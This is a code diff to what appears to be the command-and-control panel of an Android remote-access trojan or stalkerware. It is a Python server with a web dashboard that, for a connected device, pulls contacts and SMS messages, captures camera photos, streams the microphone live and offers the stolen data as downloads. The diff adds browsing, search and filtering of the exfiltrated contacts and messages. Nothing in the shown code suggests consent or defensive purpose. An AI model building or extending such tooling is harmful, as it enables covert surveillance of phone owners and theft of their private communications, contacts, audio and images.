+      <div class="messages-stack" id="modalMessagesStack"></div>
+    </div>
+  </div>
+</div>
+
+<div class="modal-backdrop" id="contactsModalBackdrop">
+  <div class="modal-container">
+    <div class="modal-header">
+      <div class="modal-header-left">
+        <button class="btn-secondary" onclick="closeContactsModal()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+          Back
+        </button>
+        <div class="modal-title">
+          Contacts
+          <span class="modal-count-badge" id="modalContactsCount">0</span>
+        </div>
+      </div>
+      <div style="display: flex; gap: 8px; align-items: center;">
+        <button class="btn-primary" onclick="pullContacts()">Pull from Device</button>
+        <a href="/api/contacts/download" id="btnModalDlZip" class="btn-link btn-secondary" style="display: none;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Download ZIP
+        </a>
+        <button class="btn-secondary" onclick="closeContactsModal()">✕</button>
+      </div>
+    </div>
+
+    <div class="modal-toolbar">
+      <div class="search-wrap">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        <input type="text" id="contactsSearchInput" placeholder="Search contacts by name or phone…" oninput="filterContacts()">
+      </div>
+    </div>
+
+    <div class="modal-body">
+      <div class="contacts-grid" id="modalContactsGrid"></div>
+    </div>
+  </div>
+</div>
+
+<div class="modal-backdrop" id="photoModalBackdrop" onclick="closePhotoModal()">
+  <div style="max-width: 90vw; max-height: 90vh; display: flex; flex-direction: column; align-items: center; gap: 12px;" onclick="event.stopPropagation()">
+    <img id="photoModalImg" style="max-width: 90vw; max-height: 80vh; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
+    <div style="display: flex; gap: 8px;">
+      <a id="btnPhotoDl" href="/api/photo/latest" download="camera_capture.jpg" class="btn-link btn-primary">Download Photo</a>
+      <button class="btn-secondary" onclick="closePhotoModal()">Close</button>
+    </div>
+  </div>
+</div>
+
 <script>
-let lastStatus = {};
+let allMessages = [];
+let allContacts = [];
+let currentDirFilter = 'all';
+let selectedCamId = '0';
 
 async function api(path, options = {}) {
   try {
@@ -508,9 +1051,9 @@ async function stopServer() {
 }
 
 async function killServer() {
-  if (confirm('Kill server process?')) {
+  if (confirm('Terminate server process?')) {
     await api('/api/server/kill', { method: 'POST' });
-    document.body.innerHTML = '<div style="padding: 40px; text-align: center; font-family: sans-serif;">Server terminated.</div>';
+    document.body.innerHTML = '<div style="padding: 60px; text-align: center; font-family: -apple-system, sans-serif;"><h2>Server process killed.</h2></div>';
   }
 }
 
@@ -532,127 +1075,293 @@ async function stopMic() {
 async function listCameras() {
   const res = await api('/api/client/cameras', { method: 'POST' });
   if (res && res.data) {
-    renderCamButtons(res.data);
+    renderCamPills(res.data);
   }
 }
 
-function renderCamButtons(cams) {
-  const box = document.getElementById('cameraButtons');
+function renderCamPills(cams) {
+  const box = document.getElementById('camPillsBox');
   box.innerHTML = '';
+  if (!cams || cams.length === 0) {
+    cams = ['0', '1'];
+  }
   cams.forEach(cam => {
-    const btn = document.createElement('button');
-    btn.className = 'btn-secondary';
-    btn.textContent = 'Cam ' + cam;
-    btn.onclick = () => {
-      document.getElementById('camIdInput').value = cam;
-      captureCamera();
+    const pill = document.createElement('button');
+    pill.className = 'cam-pill' + (cam === selectedCamId ? ' active' : '');
+    pill.textContent = 'Cam ' + cam;
+    pill.onclick = () => {
+      selectedCamId = cam;
+      renderCamPills(cams);
     };
-    box.appendChild(btn);
+    box.appendChild(pill);
   });
 }
 
-async function captureCamera() {
-  const camId = document.getElementById('camIdInput').value || '0';
+async function captureSelectedCamera() {
   const res = await api('/api/client/camera/capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ cam_id: camId })
+    body: JSON.stringify({ cam_id: selectedCamId })
   });
   if (res && res.status === 'ok') {
-    const preview = document.getElementById('cameraPreview');
-    preview.innerHTML = '<img class="preview-img" src="/api/photo/latest?t=' + Date.now() + '">';
+    const img = document.getElementById('camPreviewImg');
+    const empty = document.getElementById('camPreviewEmpty');
+    img.src = '/api/photo/latest?t=' + Date.now();
+    img.style.display = 'block';
+    empty.style.display = 'none';
   }
 }
 
-async function getContacts() {
+function openPhotoModal() {
+  const img = document.getElementById('camPreviewImg');
+  if (img.style.display !== 'none' && img.src) {
+    document.getElementById('photoModalImg').src = img.src;
+    document.getElementById('photoModalBackdrop').style.display = 'flex';
+  }
+}
+
+function closePhotoModal() {
+  document.getElementById('photoModalBackdrop').style.display = 'none';
+}
+
+async function pullContacts() {
   const res = await api('/api/client/contacts', { method: 'POST' });
-  if (res && res.status === 'ok') {
-    document.getElementById('btnDownloadContacts').style.display = 'inline-flex';
+  loadContactsList();
+}
+
+async function loadContactsList() {
+  const res = await api('/api/contacts/list');
+  if (res && res.contacts) {
+    allContacts = res.contacts;
+    document.getElementById('valContactsCount').textContent = allContacts.length;
+    document.getElementById('modalContactsCount').textContent = allContacts.length;
+    if (allContacts.length > 0) {
+      document.getElementById('btnDlZipCard').style.display = 'inline-flex';
+      document.getElementById('btnModalDlZip').style.display = 'inline-flex';
+    }
+    filterContacts();
   }
 }
 
-async function getSms() {
-  const hours = parseInt(document.getElementById('smsHoursInput').value) || 24;
+function openContactsModal() {
+  document.getElementById('contactsModalBackdrop').style.display = 'flex';
+  loadContactsList();
+}
+
+function closeContactsModal() {
+  document.getElementById('contactsModalBackdrop').style.display = 'none';
+}
+
+function filterContacts() {
+  const q = (document.getElementById('contactsSearchInput').value || '').toLowerCase().trim();
+  const grid = document.getElementById('modalContactsGrid');
+  grid.innerHTML = '';
+
+  const filtered = allContacts.filter(c => {
+    const name = (c.name || '').toLowerCase();
+    const phone = (c.phone || '').toLowerCase();
+    return name.includes(q) || phone.includes(q);
+  });
+
+  document.getElementById('modalContactsCount').textContent = filtered.length;
+
+  if (filtered.length === 0) {
+    grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #86868b; padding: 40px;">No contacts found</div>';
+    return;
+  }
+
+  filtered.forEach(c => {
+    const card = document.createElement('div');
+    card.className = 'contact-card';
+    const name = c.name || 'Unnamed';
+    const phone = c.phone || 'No phone';
+    const initial = name.charAt(0).toUpperCase() || '?';
+    card.innerHTML = `
+      <div class="contact-avatar">${initial}</div>
+      <div class="contact-info">
+        <div class="contact-name">${name}</div>
+        <a href="tel:${phone}" class="contact-phone">${phone}</a>
+      </div>
+      <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem;" onclick="copyText('${phone}')">Copy</button>
+    `;
+    grid.appendChild(card);
+  });
+}
+
+function copyText(txt) {
+  navigator.clipboard.writeText(txt);
+}
+
+async function getSms(hours) {
   const res = await api('/api/client/sms', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ hours })
+    body: JSON.stringify({ hours: parseInt(hours) || 24 })
   });
   if (res && res.data) {
-    renderSms(res.data);
+    allMessages = res.data;
+    renderCardSms(allMessages);
+    filterMessages();
   }
 }
 
-function renderSms(messages) {
-  const container = document.getElementById('smsContainer');
+async function getSmsFromCard() {
+  const h = document.getElementById('cardSmsHours').value || 24;
+  await getSms(h);
+}
+
+async function getSmsFromModal() {
+  const h = document.getElementById('modalSmsHours').value || 24;
+  await getSms(h);
+}
+
+function renderCardSms(messages) {
+  const box = document.getElementById('cardSmsList');
   if (!messages || messages.length === 0) {
-    container.innerHTML = '<span style="font-size: 0.8rem; color: #86868b; padding: 4px;">No messages found in time range</span>';
+    box.innerHTML = '<span style="font-size: 0.72rem; color: #86868b; padding: 4px;">No messages</span>';
     return;
   }
-  container.innerHTML = '';
-  messages.forEach(msg => {
+  box.innerHTML = '';
+  messages.slice(0, 3).forEach(m => {
+    const dir = m.type === 1 ? '▼ In' : '▲ Out';
+    const dStr = m.date ? new Date(m.date).toLocaleDateString() : '';
     const item = document.createElement('div');
-    item.className = 'sms-item';
-    const direction = msg.type === 1 ? '▼ Received' : '▲ Sent';
-    const dateStr = msg.date ? new Date(msg.date).toLocaleString() : '';
+    item.className = 'sms-preview-item';
     item.innerHTML = `
-      <div class="sms-meta">
-        <span><strong>${direction}</strong> ${msg.address || '?'}</span>
-        <span>${dateStr}</span>
+      <div class="sms-preview-meta">
+        <span><strong>${dir}</strong> ${m.address || '?'}</span>
+        <span>${dStr}</span>
       </div>
-      <div class="sms-body">${msg.body || ''}</div>
+      <div class="sms-preview-body">${m.body || ''}</div>
     `;
-    container.appendChild(item);
+    box.appendChild(item);
+  });
+}
+
+function openSmsModal() {
+  document.getElementById('smsModalBackdrop').style.display = 'flex';
+  filterMessages();
+}
+
+function closeSmsModal() {
+  document.getElementById('smsModalBackdrop').style.display = 'none';
+}
+
+function setDirFilter(dir) {
+  currentDirFilter = dir;
+  document.getElementById('pillDirAll').className = 'filter-pill' + (dir === 'all' ? ' active' : '');
+  document.getElementById('pillDirIn').className = 'filter-pill' + (dir === 'in' ? ' active' : '');
+  document.getElementById('pillDirOut').className = 'filter-pill' + (dir === 'out' ? ' active' : '');
+  filterMessages();
+}
+
+function clearSmsDateFilter() {
+  document.getElementById('smsDatePicker').value = '';
+  filterMessages();
+}
+
+function filterMessages() {
+  const q = (document.getElementById('smsSearchInput').value || '').toLowerCase().trim();
+  const dateVal = document.getElementById('smsDatePicker').value;
+  const stack = document.getElementById('modalMessagesStack');
+  stack.innerHTML = '';
+
+  const filtered = allMessages.filter(m => {
+    if (currentDirFilter === 'in' && m.type !== 1) return false;
+    if (currentDirFilter === 'out' && m.type === 1) return false;
+
+    if (q) {
+      const addr = (m.address || '').toLowerCase();
+      const body = (m.body || '').toLowerCase();
+      if (!addr.includes(q) && !body.includes(q)) return false;
+    }
+
+    if (dateVal && m.date) {
+      const msgDate = new Date(m.date).toISOString().slice(0, 10);
+      if (msgDate !== dateVal) return false;
+    }
+
+    return true;
+  });
+
+  document.getElementById('modalSmsCount').textContent = filtered.length;
+
+  if (filtered.length === 0) {
+    stack.innerHTML = '<div style="text-align: center; color: #86868b; padding: 40px;">No messages matching criteria</div>';
+    return;
+  }
+
+  filtered.forEach(m => {
+    const card = document.createElement('div');
+    card.className = 'msg-bubble-card';
+    const isReceived = m.type === 1;
+    const dirTag = isReceived ? '<span class="msg-dir-tag msg-dir-in">▼ Received</span>' : '<span class="msg-dir-tag msg-dir-out">▲ Sent</span>';
+    const dStr = m.date ? new Date(m.date).toLocaleString() : '';
+    card.innerHTML = `
+      <div class="msg-meta-row">
+        <div style="display: flex; align-items: center; gap: 8px;">
+          ${dirTag}
+          <strong>${m.address || '?'}</strong>
+        </div>
+        <span style="color: #86868b;">${dStr}</span>
+      </div>
+      <div class="msg-text-content">${m.body || ''}</div>
+    `;
+    stack.appendChild(card);
   });
 }
 
 async function refreshStatus() {
   const s = await api('/api/status');
   if (!s) return;
-  lastStatus = s;
 
-  const tcpBadge = document.getElementById('tcpBadge');
+  const pTcp = document.getElementById('pillTcp');
+  const tTcp = document.getElementById('txtTcp');
+  const btnStart = document.getElementById('btnStart');
   if (s.listening) {
-    tcpBadge.textContent = 'TCP: Listening';
-    tcpBadge.className = 'badge badge-on';
+    pTcp.className = 'pill pill-on';
+    tTcp.textContent = 'TCP: Listening';
+    btnStart.className = 'circle-btn circle-start active';
+    document.getElementById('valListenState').textContent = 'Active listening';
   } else {
-    tcpBadge.textContent = 'TCP: Stopped';
-    tcpBadge.className = 'badge badge-off';
+    pTcp.className = 'pill';
+    tTcp.textContent = 'TCP: Stopped';
+    btnStart.className = 'circle-btn circle-start';
+    document.getElementById('valListenState').textContent = 'Stopped';
   }
 
-  const clientBadge = document.getElementById('clientBadge');
-  const clientAddr = document.getElementById('clientAddr');
-  const clientStatusText = document.getElementById('clientStatusText');
+  const pClient = document.getElementById('pillClient');
+  const tClient = document.getElementById('txtClient');
   if (s.client_connected) {
-    clientBadge.textContent = 'Client: Connected';
-    clientBadge.className = 'badge badge-on';
-    clientAddr.textContent = s.client_addr || 'Connected';
-    clientStatusText.textContent = 'Connected';
+    pClient.className = 'pill pill-on';
+    tClient.textContent = 'Client: Connected';
+    document.getElementById('valClientAddr').textContent = s.client_addr || 'Connected';
+    document.getElementById('valClientStatus').textContent = 'Online';
   } else {
-    clientBadge.textContent = 'Client: Disconnected';
-    clientBadge.className = 'badge badge-off';
-    clientAddr.textContent = 'None';
-    clientStatusText.textContent = s.listening ? 'Waiting for connection…' : 'Server stopped';
+    pClient.className = 'pill';
+    tClient.textContent = 'Client: Disconnected';
+    document.getElementById('valClientAddr').textContent = 'Disconnected';
+    document.getElementById('valClientStatus').textContent = s.listening ? 'Waiting for connection…' : 'Server stopped';
   }
 
-  const micBadge = document.getElementById('micBadge');
-  const micStatusText = document.getElementById('micStatusText');
+  const pMic = document.getElementById('pillMic');
+  const tMic = document.getElementById('txtMic');
   if (s.mic_active) {
-    micBadge.textContent = 'Mic: Streaming';
-    micBadge.className = 'badge badge-on';
-    micStatusText.textContent = 'Streaming live';
+    pMic.className = 'pill pill-warn';
+    tMic.textContent = 'Mic: Streaming';
+    document.getElementById('valMicStatus').textContent = 'Streaming live';
   } else {
-    micBadge.textContent = 'Mic: Off';
-    micBadge.className = 'badge badge-off';
-    micStatusText.textContent = 'Inactive';
-  }
-
-  if (s.has_contacts) {
-    document.getElementById('btnDownloadContacts').style.display = 'inline-flex';
+    pMic.className = 'pill';
+    tMic.textContent = 'Mic: Off';
+    document.getElementById('valMicStatus').textContent = 'Inactive';
   }
 
   if (s.cameras && s.cameras.length > 0) {
-    renderCamButtons(s.cameras);
+    renderCamPills(s.cameras);
+  }
+
+  if (s.contacts_count !== undefined) {
+    document.getElementById('valContactsCount').textContent = s.contacts_count;
   }
 }
 
@@ -669,10 +1378,12 @@ function clearLogs() {
   document.getElementById('logConsole').textContent = '';
 }
 
+renderCamPills(['0', '1']);
 setInterval(refreshStatus, 1500);
 setInterval(refreshLogs, 2000);
 refreshStatus();
 refreshLogs();
+loadContactsList();
 </script>
 </body>
 </html>"""
@@ -788,6 +1499,12 @@ async def handle_contacts(reader: asyncio.StreamReader) -> Optional[str]:
         dest.write_bytes(data)
         state["latest_contacts"] = dest
         state["latest_contacts_bytes"] = data
+        try:
+            zf = zipfile.ZipFile(io.BytesIO(data))
+            with zf.open("contacts.json") as f:
+                state["contacts_list"] = json.loads(f.read().decode("utf-8"))
+        except Exception:
+            pass
         log_event(f"contacts saved {len(data)} bytes to {dest}")
         print(f"[contacts] saved {len(data)} bytes → {dest}")
         return str(dest)
@@ -1023,6 +1740,7 @@ async def api_status():
         "has_photo": state["latest_photo_bytes"] is not None,
         "has_contacts": state["latest_contacts_bytes"] is not None,
         "sms_count": len(state["latest_sms"]),
+        "contacts_count": len(state["contacts_list"]),
     }
 
 
@@ -1132,6 +1850,32 @@ async def api_contacts_download():
             headers={"Content-Disposition": "attachment; filename=contacts.zip"},
         )
     return Response(content=b"", status_code=404)
+
+
+@app.get("/api/contacts/list")
+async def api_contacts_list():
+    if state["contacts_list"]:
+        return {"status": "ok", "count": len(state["contacts_list"]), "contacts": state["contacts_list"]}
+    if state["latest_contacts_bytes"]:
+        try:
+            zf = zipfile.ZipFile(io.BytesIO(state["latest_contacts_bytes"]))
+            with zf.open("contacts.json") as f:
+                data = json.loads(f.read().decode("utf-8"))
+                state["contacts_list"] = data
+                return {"status": "ok", "count": len(data), "contacts": data}
+        except Exception as e:
+            return {"status": "error", "message": str(e), "contacts": []}
+    dest = Path.home() / "Desktop" / "contacts.zip"
+    if dest.exists():
+        try:
+            with zipfile.ZipFile(dest) as zf:
+                with zf.open("contacts.json") as f:
+                    data = json.loads(f.read().decode("utf-8"))
+                    state["contacts_list"] = data
+                    return {"status": "ok", "count": len(data), "contacts": data}
+        except Exception as e:
+            return {"status": "error", "message": str(e), "contacts": []}
+    return {"status": "none", "count": 0, "contacts": []}
 
 
 def print_help(post_start: bool = False, post_connect: bool = False):
